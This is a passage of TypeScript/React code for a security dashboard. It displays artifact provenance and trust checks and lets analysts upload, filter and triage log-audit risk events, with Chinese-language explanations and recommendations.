              className='min-w-0 max-w-full whitespace-pre-wrap break-all rounded-md bg-muted/35 p-2 font-mono text-[11px] leading-5 text-muted-foreground [overflow-wrap:anywhere] [word-break:break-all]'
              style={{ overflowWrap: 'anywhere', wordBreak: 'break-all' }}
            >
              {finding.evidence}
            </div>
            <div
              className='min-w-0 max-w-full whitespace-pre-wrap break-all rounded-md bg-muted/35 p-2 text-xs leading-5 text-muted-foreground [overflow-wrap:anywhere] [word-break:break-all]'
              style={{ overflowWrap: 'anywhere', wordBreak: 'break-all' }}
            >
              {finding.recommendation}
            </div>
          </CollapsibleContent>
        </Collapsible>
      </div>
    </div>
  )
}

function ProvenanceRow({
  label,
  value,
  formatter,
}: {
  label: string
  value?: string
  formatter?: (value: string) => string
}) {
  const displayValue = value ? (formatter ? formatter(value) : value) : '-'
  return (
    <div className='min-w-0 overflow-hidden rounded-md border p-3'>
      <div className='text-xs text-muted-foreground'>{label}</div>
      <div className='mt-1 break-words text-sm font-medium [overflow-wrap:anywhere]' title={value || '-'}>
        {displayValue}
      </div>
    </div>
  )
}

function artifactTrustConclusion(result: ArtifactTrustResult) {
  const score = artifactTrustScore(result)
  const reasons = result.findings.slice(0, 4).map((finding) => artifactFindingTitle(finding))
  return {
    summary: score >= 90
      ? `当前产物 ${result.artifact} 可信评分 ${score}/100，核心发布门检查通过，可进入后续发布审批。`
      : `当前产物 ${result.artifact} 可信评分 ${score}/100，建议阻断发布并重新构建。需要优先核查产物摘要、来源证明、仓库、commit、workflow、builder 和 runner 策略是否一致。`,
    reasons,
  }
}

function artifactCheckTitle(name: string) {
  const labels: Record<string, string> = {
    artifact_digest_matches_subject: '产物摘要与来源证明不一致',
    provenance_predicate_type_slsa: 'SLSA provenance 类型校验',
    source_repository_allowed: '来源仓库不符合策略',
    commit_matches_expected: 'commit 不符合预期',
    workflow_allowed: 'workflow 不在允许列表',
    builder_trusted: 'builder 可信校验',
    runner_environment_trusted: 'runner 环境不符合策略',
    attestation_max_age: 'attestation 时效校验',
    artifact_hash_baseline: '历史 hash 基线校验',
    signature_verified: '签名验签状态',
  }
  return labels[name] ?? name
}

function artifactCheckExplanation(check: ArtifactTrustCheck) {
  const title = artifactCheckTitle(check.name)
  if (check.name === 'artifact_digest_matches_subject') {
    return {
      impact: '产物内容与 attestation 声明不一致，可能存在产物被替换或证明文件不匹配。',
      action: '阻断发布，重新生成产物和 attestation，并复核构建产物 hash。',
    }
  }
  if (check.name === 'source_repository_allowed') {
    return {
      impact: '产物来源仓库不在当前信任策略中，不能证明它来自预期项目。',
      action: '确认 attestation 来源仓库，或更新可信仓库策略后重新验证。',
    }
  }
  if (check.name === 'commit_matches_expected') {
    return {
      impact: 'provenance 中的 commit 与预期提交不一致，构建输入不可确认。',
      action: '核查 release 对应 commit，使用正确提交重新构建并生成 provenance。',
    }
  }
  if (check.name === 'workflow_allowed') {
    return {
      impact: '产物由未授权 workflow 生成，发布链路不符合策略。',
      action: '只允许受控 release workflow 产生产物，并更新允许列表。',
    }
  }
  if (check.name === 'runner_environment_trusted') {
    return {
      impact: '构建 runner 不符合策略，自托管环境可能带来构建污染风险。',
      action: '使用干净 runner 重新构建，或为 self-hosted runner 建立隔离和审计策略。',
    }
  }
  if (check.name === 'signature_verified') {
    return {
      impact: '签名或远程 attestation 查询未通过，不能作为强验签证据。',
      action: '检查 gh/cosign 配置、网络访问和签名材料，必要时离线验证。',
    }
  }
  return {
    impact: `${title} 的检查结果为${artifactCheckLabel(check.status)}。`,
    action: check.status === 'pass' ? '保留该证据作为发布审计材料。' : '复核原始证据并按发布门策略修复后重新验证。',
  }
}

function artifactFindingTitle(finding: ArtifactTrustFinding) {
  if (finding.check === 'artifact_digest_matches_subject') return '产物摘要不一致'
  if (finding.check === 'source_repository_allowed') return '来源仓库不匹配'
  if (finding.check === 'commit_matches_expected') return 'commit 不符合预期'
  if (finding.check === 'workflow_allowed') return 'workflow 不在允许列表'
  if (finding.check === 'runner_environment_trusted') return 'runner 不符合策略'
  if (finding.check === 'signature_verified') return '签名验证未通过'
  return finding.title
}

function artifactFindingSummary(finding: ArtifactTrustFinding) {
  if (finding.check === 'artifact_digest_matches_subject') {
    return '产物 hash 与 attestation subject 不一致，存在产物被替换或来源证明不匹配风险。'
  }
  if (finding.check === 'source_repository_allowed') {
    return '产物来源仓库不符合当前信任策略，不能直接证明它来自预期仓库。'
  }
  if (finding.check === 'commit_matches_expected') {
    return 'provenance 中的 commit 与预期提交不一致，需要确认构建输入是否被替换。'
  }
  if (finding.check === 'workflow_allowed') {
    return '当前 workflow 不在允许列表，说明发布链路不符合既定发布门策略。'
  }
  if (finding.check === 'runner_environment_trusted') {
    return '当前 runner 环境不符合策略，自托管 runner 需要额外隔离和审计。'
  }
  if (finding.check === 'signature_verified') {
    return '签名验证或远程 attestation 查询未通过，可作为辅助风险信号处理。'
  }
  return finding.evidence
}

function shortDigest(value?: string) {
  if (!value) return '-'
  const normalized = value.startsWith('sha256:') ? value : `sha256:${value}`
  return truncateMiddle(normalized, 28)
}

function shortRepoName(value: string) {
  return value.replace(/^https:\/\/github\.com\//, '')
}

function artifactTrustScore(result: ArtifactTrustResult) {
  return result.trust_score ?? result.trustScore ?? result.summary.trust_score ?? 0
}

function splitPolicyList(value: string) {
  return value
    .split(/[\n,]+/)
    .map((item) => item.trim())
    .filter(Boolean)
}

function artifactCheckLabel(status: string) {
  if (status === 'pass') return '通过'
  if (status === 'fail') return '失败'
  if (status === 'warn') return '警告'
  if (status === 'missing') return '缺失'
  if (status === 'skipped') return '跳过'
  return status
}

function artifactCheckClass(status: string) {
  if (status === 'pass') return statusClasses.active
  if (status === 'fail') return severityClasses.critical
  if (status === 'warn' || status === 'missing') return severityClasses.medium
  return statusClasses.observed
}

function applyArtifactTrustToWorkspace(workspace: SecurityWorkspace, result: ArtifactTrustResult): SecurityWorkspace {
  const artifactFindings: SecurityFinding[] = result.findings.map((finding) => ({
    id: finding.id,
    title: finding.title,
    module: '产物可信',
    severity: finding.severity,
    score: finding.score,
    asset: result.artifact,
    evidence: finding.evidence,
    first_seen: formatLocalDateTime(result.generated_at, { fallback: '' }),
    owner: 'release-engineering',
    status: finding.recommendation,
  }))
  const findings = [
    ...artifactFindings,
    ...(workspace.findings ?? []).filter((finding) => !finding.module.includes('产物可信')),
  ]
  const artifactModule = {
    key: 'artifact_trust',
    name: '产物可信验证门',
    status: artifactTrustModuleStatus(result.level),
    score: artifactTrustScore(result),
    signals: result.summary.check_count,
    description: '验证 artifact digest、SLSA provenance、builder、workflow、commit、runner 和签名结果。',
  }
  const modules = workspace.modules.some((module) => module.key === 'artifact_trust')
    ? workspace.modules.map((module) => module.key === 'artifact_trust' ? artifactModule : module)
    : [...workspace.modules, artifactModule]

  return {
    ...workspace,
    artifact_trust: result,
    findings,
    modules,
    summary: {
      ...workspace.summary,
      open_findings: findings.length,
      critical_findings: findings.filter((finding) => finding.severity === 'critical').length,
      risk_score: Math.max(workspace.summary.risk_score, result.summary.risk_score),
    },
  }
}

function artifactTrustModuleStatus(level: string) {
  if (level === 'trusted') return 'active'
  if (level === 'warning') return 'medium'
  if (level === 'danger') return 'high'
  if (level === 'critical') return 'critical'
  return 'observed'
}

function applyLogAuditToWorkspace(workspace: SecurityWorkspace, audit: LogAuditResult): SecurityWorkspace {
  const logs = audit.findings.slice(0, 80).map((finding) => ({
    time: finding.time,
    source: finding.source,
    event: finding.event,
    severity: finding.severity,
    signal: finding.signal,
    confidence: finding.confidence,
  }))
  const logFindings: SecurityFinding[] = audit.findings.slice(0, 20).map((finding) => {
    const asset = [
      finding.source,
      finding.src_ip ? `src=${finding.src_ip}` : '',
      finding.dst_ip ? `dst=${finding.dst_ip}` : '',
      finding.path ? `path=${finding.path}` : '',
    ].filter(Boolean)

    return {
      id: finding.id,
      title: `${finding.signal}：${finding.title}`,
      module: '日志风险',
      severity: finding.severity,
      score: finding.score,
      asset: asset.join(' / '),
      evidence: finding.evidence,
      first_seen: formatLocalDateTime(finding.time, { fallback: '' }),
      owner: 'soc',
      status: `置信度 ${Math.round(finding.confidence * 100)}%，建议结合源 IP、账号和时间窗口复核。`,
    }
  })
  const findings = [
    ...logFindings,
    ...(workspace.findings ?? []).filter((finding) => !finding.module.includes('日志')),
  ]

  return {
    ...workspace,
    logs,
    log_audit: audit,
    findings,
    modules: (workspace.modules ?? []).map((module) =>
      module.key === 'logs'
        ? {
            ...module,
            signals: audit.summary.finding_count,
            status: audit.summary.risk_level === 'low' ? 'active' : audit.summary.risk_level,
            score: audit.summary.risk_score,
            description:
              '已接入日志上传批处理，覆盖 Web access log、app log、auth log 的认证异常、敏感路径、SQL 注入、外联和暴力破解。',
          }
        : module
    ),
    summary: {
      ...workspace.summary,
      log_events: audit.summary.total_events,
      open_findings: findings.length,
      critical_findings: findings.filter((finding) => finding.severity === 'critical').length,
      risk_score: Math.max(workspace.summary.risk_score, audit.summary.risk_score),
    },
  }
}

function applyMultimodalAuditToWorkspace(workspace: SecurityWorkspace, result: MultimodalAuditResult): SecurityWorkspace {
  const evidenceCount = result.summary.evidence_count
  const findingCount = result.summary.finding_count ?? 0
  const riskScore = result.summary.risk_score ?? 0
  const module = {
    key: 'multimodal',
    name: '外部告警证据',
    status: findingCount ? result.summary.risk_level : evidenceCount ? 'active' : 'observed',
    score: Math.max(riskScore, Math.min(92, 58 + evidenceCount * 3 + result.summary.derived_count * 2)),
    signals: Math.max(evidenceCount, findingCount),
    description: '上传音频、截图和视频帧，使用 Sigma 风格 YAML 规则抽取实体并生成 Wazuh 风格风险告警。',
  }
  const modules = workspace.modules.some((item) => item.key === 'multimodal')
    ? workspace.modules.map((item) => item.key === 'multimodal' ? module : item)
    : [...workspace.modules, module]

  return {
    ...workspace,
    multimodal_audit: result,
    modules,
    summary: {
      ...workspace.summary,
      multimodal_evidence: evidenceCount,
      risk_score: Math.max(workspace.summary.risk_score, riskScore),
    },
  }
}

type DisplayedLogEvent = SecurityLogEvent & {
  id?: string
  rule_id?: string
  title?: string
  score?: number
  evidence?: string
  src_ip?: string | null
  dst_ip?: string | null
  user?: string | null
  path?: string | null
  count?: number | null
  fingerprint?: string
  dedupe_key?: string
  occurrences?: number
  realtime?: boolean
}

function logSourceLabel(source: LogAuditSource) {
  if (source === 'web') return 'Web access'
  if (source === 'app') return 'App log'
  if (source === 'auth') return 'Auth log'
  return '自动识别'
}

function runtimeRiskLevel(score: number): SecuritySeverity {
  if (score >= 90) return 'critical'
  if (score >= 75) return 'high'
  if (score >= 55) return 'medium'
  return 'low'
}

function logConfidencePercent(log: DisplayedLogEvent) {
  const confidence = log.confidence ?? 0
  return Math.round(confidence <= 1 ? confidence * 100 : confidence)
}

function logRecommendationText(log: DisplayedLogEvent) {
  const text = `${log.signal} ${log.event} ${log.evidence}`.toLowerCase()
  if (/外联|egress|dst_ip|beacon|connect/.test(text)) {
    return '先核查访问来源与账号行为；对异常外联会话执行隔离，再结合敏感路径访问记录复核攻击链影响范围。'
  }
  if (/login|auth|401|403|爆破|失败/.test(text)) {
    return '核查来源 IP、账号失败次数和登录窗口，必要时临时限制来源并复核账号凭据风险。'
  }
  return '复核日志上下文、请求来源和关联资产，确认是否需要阻断会话、隔离实例或补充运行期证据。'
}

function logSourceEndpoint(log: DisplayedLogEvent) {
  return log.src_ip || log.user || log.source || '-'
}

function logTargetEndpoint(log: DisplayedLogEvent) {
  return log.dst_ip || log.path || log.signal || '-'
}

function logTimeRange(logs: DisplayedLogEvent[]) {
  const values = logs.map((log) => log.time).filter(Boolean).sort()
  if (!values.length) return '-'
  if (values.length === 1 || values[0] === values[values.length - 1]) return values[0]
  return `${values[0]} - ${values[values.length - 1]}`
}

function formatLogEvidence(text: string) {
  const value = text.trim()
  if (!value) return '未提供证据片段'
  try {
    return JSON.stringify(JSON.parse(value), null, 2)
  } catch {
    return value
  }
}

function logStructuredRecord(log: DisplayedLogEvent) {
  const evidence = log.evidence?.trim()
  if (evidence) {
    try {
      return JSON.stringify(JSON.parse(evidence), null, 2)
    } catch {
      // 非 JSON 证据会保留在结构化记录中。
    }
  }
  return JSON.stringify({
    id: log.id,
    rule_id: log.rule_id,
    time: log.time,
    source: log.source,
    event: log.event,
    signal: log.signal,
    severity: log.severity,
    confidence: log.confidence,
    src_ip: log.src_ip,
    dst_ip: log.dst_ip,
    user: log.user,
    path: log.path,
    count: log.count,
    evidence: log.evidence,
  }, null, 2)
}

function LogsPanel({
  logs,
  audit,
  workspaceId,
  onRealtimeChanged,
  onScanned,
}: {
  logs: SecurityLogEvent[]
  audit?: LogAuditResult | null
  workspaceId?: string
  onRealtimeChanged: () => Promise<void>
  onScanned: (audit: LogAuditResult) => void
}) {
  const [selectedFiles, setSelectedFiles] = useState<File[]>([])
  const logFileInputRef = useRef<HTMLInputElement>(null)
  const [source, setSource] = useState<LogAuditSource>('auto')
  const [scanning, setScanning] = useState(false)
  const [realtime, setRealtime] = useState<RealtimeLogPayload | null>(null)
  const [trend, setTrend] = useState<RealtimeLogTrendPoint[]>([])
  const [realtimeBusy, setRealtimeBusy] = useState(false)
  const [baselineBusy, setBaselineBusy] = useState(false)
  const [activeLogEventId, setActiveLogEventId] = useState<string | null>(null)
  const [severityFilter, setSeverityFilter] = useState<SecuritySeverity | 'all'>('all')
  const [logQuery, setLogQuery] = useState('')
  const fileFindings = audit?.findings ?? []
  const realtimeFindings = realtime?.findings ?? []
  const auditFiles = audit?.files ?? []
  const displayedLogs: DisplayedLogEvent[] = fileFindings.length
      ? fileFindings.map((finding) => ({ ...finding }))
    : realtimeFindings.length
      ? realtimeFindings.map((finding) => ({
          ...finding,
          realtime: true,
        }))
    : logs

  const runtimeSeverity = (log: DisplayedLogEvent): SecuritySeverity => {
    const raw = String(log.severity ?? '').toLowerCase()
    if (raw === 'critical' || raw === 'high' || raw === '严重' || raw === '高危') return 'high'
    if (raw === 'medium' || raw === '中危') return 'medium'
    if (raw === 'low' || raw === '低危') return 'low'
    const confidence = (log.confidence ?? 0) * (log.confidence && log.confidence <= 1 ? 100 : 1)
    return confidence >= 90 ? 'high' : confidence >= 70 ? 'medium' : 'low'
  }
  const normalizedLogQuery = logQuery.trim().toLowerCase()
  const filteredLogs = displayedLogs.filter((log) => {
    if (severityFilter !== 'all' && runtimeSeverity(log) !== severityFilter) return false
    if (!normalizedLogQuery) return true
    return [
      log.event,
      log.signal,
      log.source,
      log.rule_id,
      log.src_ip,
      log.dst_ip,
      log.user,
      log.path,
      log.evidence,
    ].some((value) => String(value ?? '').toLowerCase().includes(normalizedLogQuery))
  })
  const activeLog = filteredLogs.find((log) => (log.id ?? `${log.time}-${log.event}`) === activeLogEventId) ?? filteredLogs[0]
  useEffect(() => {
    void refreshRealtimeLogs(false)
  }, [])
  useEffect(() => {
    if (!activeLogEventId && filteredLogs[0]) setActiveLogEventId(filteredLogs[0].id ?? `${filteredLogs[0].time}-${filteredLogs[0].event}`)
  }, [activeLogEventId, filteredLogs])
  useEffect(() => {
    if (filteredLogs[0]) setActiveLogEventId(filteredLogs[0].id ?? `${filteredLogs[0].time}-${filteredLogs[0].event}`)
  }, [severityFilter])

  const hasAuditResult = Boolean(audit)
  const totalLogFiles = audit?.summary.file_count ?? auditFiles.length
  const parsedEventCount = audit?.summary.parsed_events ?? realtime?.summary.event_count ?? logs.length
  const findingCount = audit?.summary.finding_count ?? realtime?.summary.finding_count ?? displayedLogs.length
  const runtimeRiskScore = audit?.summary.risk_score ?? realtime?.summary.risk_score ?? 0
  const conclusionText = findingCount
    ? activeLog
      ? `发现 ${activeLog.signal} 相关运行期异常，可作为攻击链运行期印证证据。`
      : '发现运行期风险事件，可结合日志上下文复核攻击链影响范围。'
    : hasAuditResult
      ? '已完成日志解析，当前未发现需要处置的运行期风险事件。'
      : '上传应用日志、访问日志或鉴权日志后，系统会解析风险事件并生成运行期印证证据。'
  const conclusionTags = findingCount && activeLog
    ? [activeLog.source, activeLog.signal]
    : hasAuditResult
      ? ['已完成解析']
      : ['等待日志文件']
  const selectedLogFileCount = totalLogFiles || selectedFiles.length
  const sourceName = logSourceLabel(source)
  const canCreateBaseline = findingCount > 0

  async function refreshRealtimeLogs(showToast = true) {
    setRealtimeBusy(true)
    try {
      const [eventsPayload, trendPayload] = await Promise.all([
        loadRealtimeLogEvents(200),
        loadRealtimeLogTrend('minute', 60),
      ])
      setRealtime(eventsPayload)
      setTrend(trendPayload.trend ?? [])
      if (showToast) toast.success(`日志状态已刷新，当前 ${eventsPayload.summary?.finding_count ?? 0} 项风险`)
    } catch (error) {
      if (showToast) toast.error(error instanceof Error ? error.message : '日志状态刷新失败')
    } finally {
      setRealtimeBusy(false)
    }
  }

  async function startLogScan(files = selectedFiles) {
    if (!files.length) {
      toast.error('请选择至少一个日志文件')
      return
    }
    setScanning(true)
    try {
      onScanned(await runLogAuditScan({ files, source, workspaceId }))
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '日志扫描失败')
    } finally {
      setScanning(false)
    }
  }

  async function handleLogFileChange(event: ChangeEvent<HTMLInputElement>) {
    const files = Array.from(event.target.files ?? [])
    event.target.value = ''
    if (!files.length) return
    setSelectedFiles(files)
    await startLogScan(files)
  }

  async function createBaseline() {
    if (!canCreateBaseline) {
      toast.error('当前没有可纳入基线的日志风险事件')
      return
    }
    setBaselineBusy(true)
    try {
      const payload = await createRealtimeLogBaseline('前端手动建立日志风险基线')
      setRealtime(payload)
      const trendPayload = await loadRealtimeLogTrend('minute', 60)
      setTrend(trendPayload.trend ?? [])
      await onRealtimeChanged()
      toast.success(`已建立基线，隐藏 ${payload.state.baseline?.finding_count ?? 0} 项当前风险`)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '建立基线失败')
    } finally {
      setBaselineBusy(false)
    }
  }

  async function ignoreFinding(log: { fingerprint?: string; dedupe_key?: string }) {
    const token = log.dedupe_key || log.fingerprint
    if (!token) return
    setRealtimeBusy(true)
    try {
      const payload = await ignoreRealtimeLogFinding(token, '前端标记为误报')
      setRealtime(payload)
      const trendPayload = await loadRealtimeLogTrend('minute', 60)
      setTrend(trendPayload.trend ?? [])
      await onRealtimeChanged()
      toast.success('已标记为误报')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '标记误报失败')
    } finally {
      setRealtimeBusy(false)
    }
  }

  return (
    <div className='space-y-4'>
      <section className='rounded-md border border-border bg-[color:var(--surface-card)] p-4 shadow-none' style={{ boxShadow: 'none' }}>
        <div className='flex flex-wrap items-start justify-between gap-4'>
          <div className='min-w-0'>
            <div className='flex items-center gap-3'>
              <span className='grid size-9 place-items-center rounded-md border border-cyan-300/25 bg-cyan-400/10 text-cyan-700 dark:text-cyan-100'>
                <Search className='size-5' />
              </span>
              <h2 className='text-page-title text-page-title-on-dark'>日志运行期印证</h2>
            </div>
            <div className='mt-2 h-px w-56 bg-gradient-to-r from-cyan-300/55 via-cyan-300/20 to-transparent' />
            <div className='mt-3 flex flex-wrap items-center gap-2'>
              <span className='meta-chip-dark'>{sourceName}</span>
              {realtime?.state.baseline ? <span className='meta-chip-dark'>已建立基线</span> : <span className='meta-chip-dark'>尚未建立基线</span>}
            </div>
          </div>
          <div className='flex flex-wrap items-center justify-end gap-2'>
            <Select value={source} onValueChange={(value) => setSource(value as LogAuditSource)}>
              <SelectTrigger size='sm' className='h-8 w-[132px] rounded-md border-border bg-[color:var(--surface-inset)] text-foreground'>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value='auto'>自动识别</SelectItem>
                <SelectItem value='web'>Web access</SelectItem>
                <SelectItem value='app'>App log</SelectItem>
                <SelectItem value='auth'>Auth log</SelectItem>
              </SelectContent>
            </Select>
            <input
              ref={logFileInputRef}
              type='file'
              multiple
              accept='.log,.txt,.json,.jsonl'
              className='hidden'
              onChange={(event) => void handleLogFileChange(event)}
            />
            <Button size='sm' className={actionButtonClass} onClick={() => logFileInputRef.current?.click()} disabled={scanning}>
              {scanning ? <Loader2 className='size-4 animate-spin' /> : <FileSearch className='size-4' />}
              上传日志
            </Button>
            <Button size='sm' variant='outline' onClick={() => void refreshRealtimeLogs()} disabled={realtimeBusy}>
              {realtimeBusy ? <Loader2 className='size-4 animate-spin' /> : <RefreshCw className='size-4' />}
              刷新状态
            </Button>
            <Button size='sm' variant='outline' onClick={() => void createBaseline()} disabled={baselineBusy || !canCreateBaseline}>
              {baselineBusy ? <Loader2 className='size-4 animate-spin' /> : <ShieldCheck className='size-4' />}
              建立基线
            </Button>
          </div>
        </div>
      </section>

      <LogRiskOverviewCard
        score={runtimeRiskScore}
        files={selectedLogFileCount}
        parsedEvents={parsedEventCount}
        findingCount={findingCount}
        logs={displayedLogs}
        conclusionText={conclusionText}
        conclusionTags={conclusionTags}
        runtimeSeverity={runtimeSeverity}
      />
      <div className='grid min-w-0 gap-4 xl:grid-cols-[minmax(0,1.7fr)_minmax(360px,0.9fr)]'>
        <LogEventListCard
          logs={filteredLogs}
          totalCount={displayedLogs.length}
          activeLog={activeLog}
          severityFilter={severityFilter}
          onSeverityFilter={setSeverityFilter}
          query={logQuery}
          onQuery={setLogQuery}
          onSelect={(log) => setActiveLogEventId(log.id ?? `${log.time}-${log.event}`)}
          runtimeSeverity={runtimeSeverity}
        />
        <LogEventDetailWorkbench
          log={activeLog}
          totalCount={filteredLogs.length}
          runtimeSeverity={runtimeSeverity}
          ignoreBusy={realtimeBusy}
          onIgnore={(log) => void ignoreFinding(log)}
        />
      </div>
    </div>
  )
}

function LogRiskOverviewCard({
  score,
  files,
  parsedEvents,
  findingCount,
  logs,
  conclusionText,
  conclusionTags,
  runtimeSeverity,
}: {
  score: number
  files: number
  parsedEvents: number
  findingCount: number
  logs: DisplayedLogEvent[]
  conclusionText: string
  conclusionTags: string[]
  runtimeSeverity: (log: DisplayedLogEvent) => SecuritySeverity
}) {
  const riskLevel = runtimeRiskLevel(score)
  const { value: displayScore } = useAnimatedNumber(score, {
    stiffness: 90,
    damping: 18,
    delayMs: 80,
    durationMs: 900,
    resetKey: `${score}-${findingCount}-${parsedEvents}`,
  })
  const severityData = [
    { label: '高危', value: logs.filter((log) => runtimeSeverity(log) === 'high').length, color: 'bg-red-500' },
    { label: '中危', value: logs.filter((log) => runtimeSeverity(log) === 'medium').length, color: 'bg-amber-400' },
    { label: '低危', value: logs.filter((log) => runtimeSeverity(log) === 'low').length, color: 'bg-cyan-400' },
  ]
  const severityTotal = Math.max(1, severityData.reduce((sum, item) => sum + item.value, 0))
  const scoreTone = score >= 90
    ? 'text-red-600 dark:text-red-300'
    : score >= 75
      ? 'text-orange-600 dark:text-orange-300'
      : score >= 55
        ? 'text-amber-600 dark:text-amber-300'
        : 'text-emerald-600 dark:text-emerald-300'
  const metrics = [
    { label: '日志文件', value: files },
    { label: '解析事件', value: parsedEvents },
    { label: '风险事件', value: findingCount },
    { label: '事件窗口', value: logTimeRange(logs), wide: true },
  ]

  return (
    <Card className='min-w-0 overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-none' style={{ boxShadow: 'none' }}>
      <CardContent className='p-0'>
        <div className='grid lg:grid-cols-[250px_minmax(0,1fr)]'>
          <div className='flex items-center gap-4 border-b border-border px-5 py-5 lg:border-r lg:border-b-0'>
            <span className='grid size-10 shrink-0 place-items-center rounded-md border border-red-400/25 bg-red-500/10 text-red-600 dark:text-red-300'>
              <ShieldAlert className='size-5' />
            </span>
            <div className='min-w-0'>
              <div className='flex items-end gap-2'>
                <span className={cn('text-4xl font-bold leading-none tabular-nums', scoreTone)}>{displayScore}</span>
                <span className='pb-0.5 text-xs font-medium text-muted-foreground'>/ 100</span>
              </div>
              <div className='mt-2 flex items-center gap-2'>
                <span className='text-xs font-semibold text-foreground'>最高事件风险</span>
                <SeverityPill severity={riskLevel} />
              </div>
            </div>
          </div>
          <div className='min-w-0 px-5 py-4'>
            <div className='grid grid-cols-2 gap-y-4 sm:grid-cols-[0.65fr_0.65fr_0.65fr_1.55fr] sm:divide-x sm:divide-border'>
              {metrics.map((metric) => (
                <div key={metric.label} className='min-w-0 px-3 first:pl-0 last:pr-0'>
                  <div className='text-xs font-medium text-muted-foreground'>{metric.label}</div>
                  <div className={cn('mt-1 font-bold text-foreground', metric.wide ? 'truncate text-sm' : 'text-2xl tabular-nums')} title={String(metric.value)}>
                    {metric.value}
                  </div>
                </div>
              ))}
            </div>
            <div className='mt-4 grid gap-3 border-t border-border pt-3 lg:grid-cols-[minmax(0,1fr)_auto]'>
              <div className='flex min-w-0 items-start gap-2'>
                <ShieldCheck className='mt-0.5 size-4 shrink-0 text-cyan-700 dark:text-cyan-300' />
                <span className='line-clamp-2 text-xs leading-5 text-muted-foreground' title={conclusionText}>{conclusionText}</span>
              </div>
              <div className='flex flex-wrap items-center gap-3 text-xs text-muted-foreground'>
                {severityData.map((item) => (
                  <span key={item.label} className='inline-flex items-center gap-1.5 tabular-nums'>
                    <span className={cn('size-2 rounded-sm', item.color)} />
                    {item.label} {item.value}
                  </span>
                ))}
                {conclusionTags.slice(0, 2).map((tag) => <span key={tag} className='meta-chip'>{tag}</span>)}
              </div>
            </div>
            <div className='mt-3 flex h-1.5 overflow-hidden rounded-full bg-[color:var(--muted)]'>
              {severityData.filter((item) => item.value > 0).map((item) => (
                <span key={item.label} className={item.color} style={{ width: `${(item.value / severityTotal) * 100}%` }} />
              ))}
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

function LogEventListCard({
  logs,
  totalCount,
  activeLog,
  severityFilter,
  onSeverityFilter,
  query,
  onQuery,
  onSelect,
  runtimeSeverity,
}: {
  logs: DisplayedLogEvent[]
  totalCount: number
  activeLog?: DisplayedLogEvent
  severityFilter: SecuritySeverity | 'all'
  onSeverityFilter: (value: SecuritySeverity | 'all') => void
  query: string
  onQuery: (value: string) => void
  onSelect: (log: DisplayedLogEvent) => void
  runtimeSeverity: (log: DisplayedLogEvent) => SecuritySeverity
}) {
  return (
    <Card className='flex h-[620px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-none' style={{ boxShadow: 'none' }}>
      <CardHeader className='border-b border-border pb-3'>
        <div className='flex flex-wrap items-start justify-between gap-3'>
          <div className='min-w-0'>
            <div className='flex items-center gap-2'>
              <CardTitle className='text-section-title'>运行期风险事件</CardTitle>
              <span className='meta-chip'>{logs.length}/{totalCount}</span>
            </div>
            <div className='mt-1 text-xs text-muted-foreground'>按风险等级、来源和时间复核运行期异常</div>
          </div>
          <div className='flex flex-wrap items-center gap-2'>
            <div className='relative w-[220px] max-w-full'>
              <Search className='pointer-events-none absolute left-3 top-1/2 size-3.5 -translate-y-1/2 text-muted-foreground' />
              <Input
                value={query}
                onChange={(event) => onQuery(event.target.value)}
                placeholder='搜索事件、IP、规则或路径'
                className='h-8 bg-[color:var(--surface-inset)] pl-9 text-xs'
              />
            </div>
            <Select value={severityFilter} onValueChange={(value) => onSeverityFilter(value as SecuritySeverity | 'all')}>
              <SelectTrigger size='sm' className='h-8 min-w-[104px] rounded-md border-border bg-[color:var(--surface-inset)] text-foreground'>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value='all'>全部等级</SelectItem>
                <SelectItem value='high'>高危</SelectItem>
                <SelectItem value='medium'>中危</SelectItem>
                <SelectItem value='low'>低危</SelectItem>
              </SelectContent>
            </Select>
          </div>
        </div>
      </CardHeader>
      <CardContent className='min-h-0 flex-1 p-0'>
        {logs.length ? (
          <div className='flex h-full min-h-0 flex-col'>
            <div className='hidden grid-cols-[88px_minmax(200px,1.25fr)_minmax(100px,0.7fr)_minmax(110px,0.75fr)_150px_72px] gap-3 border-b border-border bg-[color:var(--surface-inset)] px-5 py-2 text-[11px] font-semibold text-muted-foreground lg:grid'>
              <span>等级</span>
              <span>事件</span>
              <span>来源</span>
              <span>目标</span>
              <span>发生时间</span>
              <span className='text-right'>置信度</span>
            </div>
            <div className='min-h-0 flex-1 overflow-y-auto overscroll-contain [scrollbar-gutter:stable] [scrollbar-width:thin]'>
              {logs.map((log) => {
                const selected = (log.id ?? `${log.time}-${log.event}`) === (activeLog?.id ?? `${activeLog?.time}-${activeLog?.event}`)
                return (
                  <motion.button
                    key={`${log.time}-${log.event}-${log.signal}-${log.fingerprint ?? ''}`}
                    type='button'
                    layout
                    onClick={() => onSelect(log)}
                    className={cn(
                      'grid w-full grid-cols-[auto_minmax(0,1fr)_auto] items-center gap-3 border-b border-border/70 px-5 py-3.5 text-left text-xs transition-colors lg:grid-cols-[88px_minmax(200px,1.25fr)_minmax(100px,0.7fr)_minmax(110px,0.75fr)_150px_72px]',
                      selected
                        ? 'bg-cyan-500/10 shadow-[inset_3px_0_0_rgb(6,182,212)]'
                        : 'hover:bg-[color:var(--surface-inset)]',
                    )}
                  >
                    <SeverityPill severity={runtimeSeverity(log)} />
                    <div className='min-w-0'>
                      <div className='truncate text-sm font-semibold text-foreground' title={log.event}>{log.event}</div>
                      <div className='mt-1 truncate font-mono text-[11px] text-muted-foreground' title={log.rule_id || log.signal}>
                        {log.rule_id || log.signal}
                      </div>
                    </div>
                    <span className='hidden truncate text-xs text-muted-foreground lg:block' title={logSourceEndpoint(log)}>{logSourceEndpoint(log)}</span>
                    <span className='hidden truncate text-xs text-muted-foreground lg:block' title={logTargetEndpoint(log)}>{logTargetEndpoint(log)}</span>
                    <span className='hidden truncate text-xs tabular-nums text-muted-foreground lg:block' title={log.time}>{log.time}</span>
                    <span className='meta-chip justify-self-end tabular-nums'>{logConfidencePercent(log)}%</span>
                  </motion.button>
                )
              })}
            </div>
          </div>
        ) : (
          <div className='grid h-full place-items-center p-6 text-center text-sm text-muted-foreground'>暂无符合条件的运行期风险事件</div>
        )}
      </CardContent>
    </Card>
  )
}

